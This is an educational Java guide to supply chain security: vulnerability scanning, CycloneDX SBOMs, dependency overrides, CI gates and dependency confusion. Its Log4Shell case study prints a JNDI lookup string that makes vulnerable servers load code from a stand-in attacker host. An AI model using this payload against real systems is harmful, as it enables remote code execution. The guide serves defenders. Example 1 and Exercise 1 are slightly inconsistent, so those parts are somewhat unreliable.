# Dependency Security and Supply Chain in Java

> Managing third-party library risks, automated vulnerability scanning (OWASP Dependency-Check, Snyk, Trivy), Software Bill of Materials (SBOM / CycloneDX), dependency pinning, and supply chain integrity.

| Metadata | Details |
| :--- | :--- |
| **Level** | Advanced / Enterprise Architecture |
| **Prerequisites** | [18_build-and-dependencies](../18-build-and-dependencies/README.md), [00_input-validation-and-injection](00_input-validation-and-injection.md) |
| **Time to Read** | 35 minutes |
| **Status** | Verified Production Guide |
| **Java Baseline** | Java 17 LTS / Java 21 LTS / Java 25 LTS |

---

## Table of Contents
1. [What & Why](#1-what--why)
2. [Core Concepts](#2-core-concepts)
3. [How It Works Internally](#3-how-it-works-internally)
4. [Syntax & Usage](#4-syntax--usage)
5. [Practical Examples](#5-practical-examples)
6. [Best Practices](#6-best-practices)
7. [Common Mistakes & Pitfalls](#7-common-mistakes--pitfalls)
8. [Performance & Security Notes](#8-performance--security-notes)
9. [Comparison / When to Use What](#9-comparison--when-to-use-what)
10. [Interview Questions & Answers](#10-interview-questions--answers)
11. [Practice Exercises](#11-practice-exercises)
12. [Summary / Cheat Sheet](#12-summary--cheat-sheet)
13. [Further Reading](#13-further-reading)

---

## 1. What & Why

### What is Software Supply Chain Security?
In modern enterprise Java applications, first-party code written by internal developers constitutes only **10% to 20%** of the total shipped binary. The remaining **80% to 90%** consists of open-source third-party dependencies, build plugins, and transitive libraries drawn from Maven Central.

Software supply chain security encompasses:
- Identifying and remediating known Common Vulnerabilities and Exposures (CVEs) in libraries.
- Generating and publishing verified Software Bill of Materials (SBOMs).
- Defending against malicious package injection (typosquatting, dependency confusion, account takeovers).
- Verifying cryptographic signatures of artifacts downloaded during builds.

### Why Supply Chain Attacks Matter (Log4Shell Case Study)
In December 2021, CVE-2021-44228 (**Log4Shell**) shook global infrastructure. A single transitive dependency (`log4j-core`) allowed remote attackers to execute arbitrary code via a simple string logged by applications:
```
${jndi:ldap://attacker.com/a}
```
Organizations that lacked visibility into their dependency graphs took weeks or months to locate and patch every microservice containing the vulnerable library. Automated dependency auditing is no longer optional—it is a critical compliance and security requirement.

---

## 2. Core Concepts

### Transitive Dependencies
When an application declares a dependency on `org.springframework.boot:spring-boot-starter-web`, Maven or Gradle resolves dozens of secondary ("transitive") dependencies: Jackson, Tomcat-embed, SLF4J, SnakeYAML, etc.
- Vulnerabilities frequently lurk 4 or 5 levels deep in the transitive graph.
- Developers often do not realize a vulnerable library is packaged in their WAR/JAR because it is not explicitly listed in their top-level `pom.xml` or `build.gradle`.

### Software Bill of Materials (SBOM)
An SBOM is a formal, machine-readable inventory of software components, dependencies, and metadata:
- **CycloneDX**: An OWASP-backed standard designed specifically for application security and supply chain analysis.
- **SPDX (Software Package Data Exchange)**: An ISO standard (ISO/IEC 5962:2021) focused on open source licensing and compliance.

### Dependency Confusion & Typosquatting
- **Dependency Confusion**: An attacker publishes a malicious package on a public repository (Maven Central) with the same name as an internal private corporate package (e.g., `com.company.internal:auth-utils`). If repository resolution order is misconfigured, build tools download the public attacker version.
- **Typosquatting**: Registering packages with names visually similar to popular libraries (e.g., `com.fasterxml.jackson:jackson-core` instead of `com.fasterxml.jackson.core:jackson-core`).

---

## 3. How It Works Internally

### The Vulnerability Matching Pipeline
Security scanners (like OWASP Dependency-Check or Snyk) work by analyzing artifact metadata:

```
[ pom.xml / build.gradle ]
            |
            v
[ Dependency Resolution Tree ]
            | Extracts: GroupId, ArtifactId, Version, SHA-256 Hash
            v
[ CPE / PURL Identifier Generation ]
  (e.g., pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1)
            |
            v
[ Query Vulnerability Databases ]
  (NVD / GitHub Advisory Database / OSV.dev)
            |
            v
[ Risk Assessment & Build Quality Gate ]
  CVSS Score >= 7.0 -> FAIL BUILD
```

1. **PURL (Package URL)**: Standardized URI syntax for identifying software packages across ecosystems.
2. **CPE (Common Platform Enumeration)**: NVD standard for identifying vulnerable hardware and software systems.
3. **CVSS (Common Vulnerability Scoring System)**: Standard score from 0.0 to 10.0 indicating severity.

---

## 4. Syntax & Usage

### 1. OWASP Dependency-Check Maven Plugin Configuration
Add the plugin to `pom.xml` to automatically scan dependencies and fail builds on severe vulnerabilities:

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.9</version>
    <configuration>
        <failBuildOnCVSS>7.0</failBuildOnCVSS>
        <suppressionFiles>
            <suppressionFile>dependency-suppression.xml</suppressionFile>
        </suppressionFiles>
        <formats>
            <format>HTML</format>
            <format>JSON</format>
        </formats>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### 2. CycloneDX Maven Plugin for SBOM Generation
Generate a standard CycloneDX SBOM during the package phase:

```xml
<plugin>
    <groupId>org.cyclonedx</groupId>
    <artifactId>cyclonedx-maven-plugin</artifactId>
    <version>2.7.11</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals>
                <goal>makeBom</goal>
            </goals>
        </execution>
    </executions>
    <configuration>
        <projectType>application</projectType>
        <schemaVersion>1.5</schemaVersion>
    </configuration>
</plugin>
```

---

## 5. Practical Examples

### Example 1: Resolving and Overriding a Vulnerable Transitive Dependency
**Goal:** Your project uses `library-a:1.0.0` which transitively pulls in `vulnerable-lib:2.0.0` (affected by a critical CVE). Force the build to use the patched version `vulnerable-lib:2.0.4`.

**In Maven (`pom.xml`):**
```xml
<dependencyManagement>
    <dependencies>
        <!-- Force modern secure version across entire transitive dependency graph -->
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-text</artifactId>
            <version>1.10.0</version>
        </dependency>
    </dependencies>
</dependencyManagement>
```

**In Gradle (`build.gradle`):**
```groovy
configurations.all {
    resolutionStrategy.eachDependency { DependencyResolveDetails details ->
        if (details.requested.group == 'org.apache.commons' && details.requested.name == 'commons-text') {
            details.useVersion '1.10.0'
            details.because 'Mitigate CVE-2022-42889 (Text4Shell)'
        }
    }
}
```

### Example 2: Inspecting Dependency Trees via CLI
**Goal:** Pinpoint exactly which top-level dependency introduced a vulnerable artifact into your application.

```bash
# In Maven:
mvn dependency:tree -Dincludes=org.apache.commons:commons-text

# Output:
# [INFO] com.company:my-service:jar:1.0.0
# [INFO] \- com.thirdparty:reporting-engine:jar:3.2.1:compile
# [INFO]    \- org.apache.commons:commons-text:jar:1.9.0:compile (VULNERABLE!)

# In Gradle:
./gradlew dependencyInsight --dependency commons-text --configuration runtimeClasspath
```

### Example 3: Documenting Vulnerability Suppressions
**Goal:** Suppress false positives or mitigated CVEs cleanly with audit rationale (`dependency-suppression.xml`).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
    <suppress>
        <notes><![CDATA[
            CVE-2023-XXXXX: Vulnerability requires enabling experimental XML parsing features
            which are explicitly disabled in our application configuration. Mitigated via code.
        ]]></notes>
        <packageUrl regex="true">^pkg:maven/org\.example/parser@.*$</packageUrl>
        <cve>CVE-2023-XXXXX</cve>
    </suppress>
</suppressions>
```

---

### Example 4: Automated CI/CD GitHub Actions Workflow with Security Gate
**Goal:** Run OWASP Dependency-Check on every Pull Request, fail on CVSS $\ge 7.0$, and upload CycloneDX SBOM to GitHub Security tab.

```yaml
name: Dependency & Supply Chain Security Audit

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source Code
        uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'
          cache: 'maven'

      - name: Build and Generate CycloneDX SBOM
        run: mvn clean package -DskipTests org.cyclonedx:cyclonedx-maven-plugin:2.7.11:makeBom

      - name: Run OWASP Dependency Check
        run: |
          mvn org.owasp:dependency-check-maven:9.0.9:check \
            -DfailBuildOnCVSS=7.0 \
            -Dformat=ALL

      - name: Upload Dependency Check Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: dependency-check-report
          path: target/dependency-check-report.html

      - name: Upload SBOM to Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: cyclonedx-sbom
          path: target/bom.json
```

### Example 5: Automated Dependabot Configuration for Daily Patch Tracking
**Goal:** Configure `.github/dependabot.yml` to automatically submit Pull Requests for Maven dependencies and GitHub Actions daily.

```yaml
version: 2
updates:
  # Maintain dependencies for Maven
  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    versioning-strategy: increase-if-necessary
```

## 6. Best Practices

1. **Automate Scanning in CI/CD**: Integrate dependency auditing (`mvn verify` or `trivy fs .`) into pull request pipelines; block merges with CVSS scores $\ge 7.0$.
2. **Generate SBOMs on Every Release**: Produce CycloneDX SBOMs and store them alongside container images and JAR releases.
3. **Use Dependency Locking / Reproducible Builds**: Use Gradle dependency locking or Maven lockfiles to ensure build outputs are deterministic.
4. **Use Internal Artifact Repositories (Nexus / Artifactory)**: Never allow build agents to download directly from the public internet. Proxy and cache approved packages through internal registries.
5. **Enforce Repository Resolution Rules**: Configure private repository managers to block public namespaces matching internal corporate package prefixes (preventing Dependency Confusion).
6. **Keep Dependencies Up to Date**: Use automated dependency update tools (Renovate or Dependabot) to merge minor/patch security updates continuously.

---

## 7. Common Mistakes & Pitfalls

| Mistake | Why It Fails | Secure Fix |
| :--- | :--- | :--- |
| **Only scanning top-level `pom.xml` dependencies** | Over 80% of critical vulnerabilities reside in transitive dependencies. | Scan the fully resolved classpath graph. |
| **Ignoring build plugins** | Build plugins (`<plugin>`) execute during compilation and can execute arbitrary code. | Pin plugin versions and scan build plugins. |
| **Using dynamic version ranges (`[1.0,)` or `1.0.+`)** | Builds become non-reproducible; an attacker compromise of a package immediately infects builds. | Use exact, pinned semantic versions. |
| **Indiscriminately suppressing CVE warnings** | Leaves active exploitable vulnerabilities unmonitored. | Require sign-off and expiration dates on all suppression rules. |
| **Downloading dependencies over plain HTTP** | Allows Man-in-the-Middle (MitM) attackers to poison JARs in transit. | Enforce HTTPS exclusively for all repository mirrors. |
| **Allowing public repo fallback before private repo** | Exposes build to Dependency Confusion attacks. | Prioritize internal corporate repositories in mirror definitions. |

---

## 8. Performance & Security Notes

### Managing Vulnerability Database Latency in CI/CD
Tools like OWASP Dependency-Check download massive NVD data feeds at startup, which can add 5–10 minutes to build pipelines:
- **Central NVD Proxy**: Host a local caching mirror or use pre-cached runner images.
- **Commercial / Fast Scanners**: Tools like `Trivy`, `Snyk`, or `OSV-Scanner` query cloud APIs in milliseconds without downloading entire offline NVD archives.

---

## 9. Comparison / When to Use What

| Security Tool | Primary Strength | Ideal Integration Stage | License |
| :--- | :--- | :--- | :--- |
| **OWASP Dependency-Check** | Deep NVD analysis, free, open source | CI build verification | Free / Apache 2.0 |
| **Trivy (Aqua Security)** | Blazing fast, scans OS + Java + Containers | CI/CD container scanning | Free / Apache 2.0 |
| **Snyk** | Rich developer fix PRs, license checks | IDE, GitHub PR bot | Commercial / Freemium |
| **CycloneDX Plugin** | Standardized SBOM generation | Release packaging | Free / Apache 2.0 |
| **Dependabot / Renovate** | Automated patch creation & updates | GitHub / GitLab repo level | Free |

---

## 10. Interview Questions & Answers

### Q1: What is a transitive dependency and why do transitive vulnerabilities pose higher risk?
<details>
<summary>View Answer</summary>
A transitive dependency is a library required not directly by your application, but by one of your direct dependencies. Transitive vulnerabilities pose high risk because developers are often unaware these libraries exist in their deployment bundle. Standard security audits that inspect only top-level build manifests (`pom.xml` or `build.gradle`) overlook them. Attackers exploit these hidden libraries because they often remain unpatched long after direct dependencies have been updated.
</details>

### Q2: What is an SBOM and what role does it play in modern software security?
<details>
<summary>View Answer</summary>
A Software Bill of Materials (SBOM) is a complete, machine-readable inventory of all software components, libraries, modules, and licenses comprising an application. Standardized under formats like CycloneDX and SPDX, an SBOM enables organizations to rapidly determine whether newly announced zero-day vulnerabilities (like Log4Shell) affect their services without needing to recompile or analyze source code repositories.
</details>

### Q3: What is a Dependency Confusion attack and how do you protect a Java organization against it?
<details>
<summary>View Answer</summary>
Dependency Confusion occurs when an attacker uploads a malicious package to a public repository (such as Maven Central) using the identical name of an internal private library (e.g. `com.mybank:internal-auth`). If the build system or proxy repository manager is misconfigured to search public repositories before or concurrently with internal private registries, the build tool may pull the higher-versioned malicious public artifact. Defense: Use registered domain namespaces on Maven Central, configure artifact repository managers (Nexus/Artifactory) with exclusive routing rules for internal namespaces, and never query public repositories for private prefixes.
</details>

### Q4: How do you force a patched transitive dependency version in Maven?
<details>
<summary>View Answer</summary>
In Maven, you declare the desired version inside the `<dependencyManagement>` section of the parent or root `pom.xml`. The `<dependencyManagement>` block sets the authoritative version for that artifact across all modules and all transitive dependencies in the build tree without forcing it to be a direct compile dependency if not needed.
</details>

### Q5: What is the CVSS score, and what are its component metrics?
<details>
<summary>View Answer</summary>
CVSS (Common Vulnerability Scoring System) provides a numerical rating (0.0 to 10.0) reflecting the severity of a security vulnerability. It consists of Base (exploitability, access vector, privileges required, impact on confidentiality/integrity/availability), Temporal (exploit maturity, remediation level), and Environmental (organization-specific mitigations) metrics. Scores 7.0–8.9 are High; 9.0–10.0 are Critical.
</details>

### Q6: Why should build files avoid dynamic versions (e.g., `1.+` or `LATEST`)?
<details>
<summary>View Answer</summary>
Dynamic version ranges introduce non-deterministic builds. A build that succeeded on Monday may fail or pull in a compromised package on Tuesday without any code changes in the repository. Dynamic versions also prevent reliable caching and defeat reproducible build verification.
</details>

### Q7: What is the difference between CycloneDX and SPDX?
<details>
<summary>View Answer</summary>
Both are major open standards for SBOMs. CycloneDX (developed by OWASP) was built from the ground up for application security, vulnerability identification, and supply chain analysis. SPDX (an ISO standard governed by the Linux Foundation) originated with a strong focus on open source software license tracking and intellectual property compliance. Modern security tools generally ingest and export both formats.
</details>

### Q8: How does artifact signing with PGP/GPG work on Maven Central?
<details>
<summary>View Answer</summary>
Maven Central enforces that every published artifact (`.jar`, `.pom`) must be accompanied by a cryptographic ASCII-armored detached signature (`.asc`) created by the author\'s GPG private key. Consumers and build tools can verify that the downloaded binary was signed by the legitimate key holder and has not been tampered with or corrupted in transit.
</details>

---

## 11. Practice Exercises

### Exercise 1: Analyze a Dependency Tree for Vulnerabilities
**Task:** Write a simple shell/script command that runs Maven dependency tree generation and extracts all occurrences of Jackson databind below version `2.15.0`.
<details>
<summary>View Solution</summary>

```bash
mvn dependency:tree | grep "com.fasterxml.jackson.core:jackson-databind"
```
</details>

### Exercise 2: Create a Maven `<dependencyManagement>` Mitigation Block
**Task:** Configure a `pom.xml` snippet that overrides both `snakeyaml` to version `2.2` and `json-smart` to `2.5.0` across all modules.
<details>
<summary>View Solution</summary>

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
            <version>2.2</version>
        </dependency>
        <dependency>
            <groupId>net.minidev</groupId>
            <artifactId>json-smart</artifactId>
            <version>2.5.0</version>
        </dependency>
    </dependencies>
</dependencyManagement>
```
</details>

### Exercise 3: CycloneDX SBOM Verification Command
**Task:** Write a command to generate an SBOM with Maven and verify the generated JSON file contains valid component declarations.
<details>
<summary>View Solution</summary>

```bash
mvn org.cyclonedx:cyclonedx-maven-plugin:2.7.11:makeBom
# Verify output
cat target/bom.json | grep '"bomFormat": "CycloneDX"'
```
</details>

---

## 12. Summary / Cheat Sheet

- **Supply Chain Risks**: 80%+ of application code is open source dependencies; monitor transitive trees.
- **Fail Builds Early**: Enforce CVSS $\ge 7.0$ build failures in CI with OWASP Dependency-Check or Trivy.
- **SBOM Standard**: Generate CycloneDX SBOMs during release builds.
- **Transitive Overrides**: Use Maven `<dependencyManagement>` or Gradle `resolutionStrategy` to force patched versions.
- **Dependency Confusion**: Never configure public repository fallbacks for private internal corporate artifact prefixes.
- **Version Pinning**: Use strict static semantic versions; avoid dynamic `+` or range versions.

---

## 13. Further Reading
- OWASP Dependency-Check: [Official Documentation](https://jeremylong.github.io/DependencyCheck/)
- CycloneDX Specification: [CycloneDX SBOM Standard](https://cyclonedx.org/)
- NIST SP 800-161: [Cybersecurity Supply Chain Risk Management Practices](https://csrc.nist.gov/publications/detail/sp/800-161/rev-1/final)
- CISA: [Software Bill of Materials (SBOM) Guidance](https://www.cisa.gov/sbom)
